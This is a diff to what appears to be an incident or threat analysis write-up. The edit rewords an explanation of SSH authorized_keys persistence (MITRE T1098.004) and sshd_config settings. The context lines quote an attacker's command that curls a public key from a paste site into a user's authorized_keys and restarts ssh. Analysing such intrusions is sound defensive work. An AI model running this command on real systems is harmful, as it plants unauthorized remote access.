@@ -193,7 +193,7 @@ curl https://pastes.io/raw/hffgra4unv >> /home/ubuntu/.ssh/authorized_keys
 sudo service ssh restart**
 ```
 
-A persistence technique identified by MITRE with a technique ID [T1098.004](https://attack.mitre.org/techniques/T1098/004/). Basically, the adversary used a public key and inserted in into the `/home/ubuntu/.ssh/authorized_keys` file. This technique needs the derivative `PubkeyAuthentication` set to `yes` in the `/etc/ssh/sshd_config` file. And, also the TA can modify the `sshd_config` file further and set the `RSAAuthentication` to the value `yes`, if the public key algorithm is RSA based.
+A persistence technique identified by MITRE with a technique ID [T1098.004](https://attack.mitre.org/techniques/T1098/004/). Basically, the adversary used a public key and inserted in into the `/home/ubuntu/.ssh/authorized_keys` file. In this technique the TA can also set the derivative `PubkeyAuthentication` set to `yes` in the `/etc/ssh/sshd_config` file. And, also can modify the `sshd_config` file further and set the `RSAAuthentication` to the value `yes`, if the public key algorithm is RSA based.
 
 The Public Key used by the TA:
 ```text
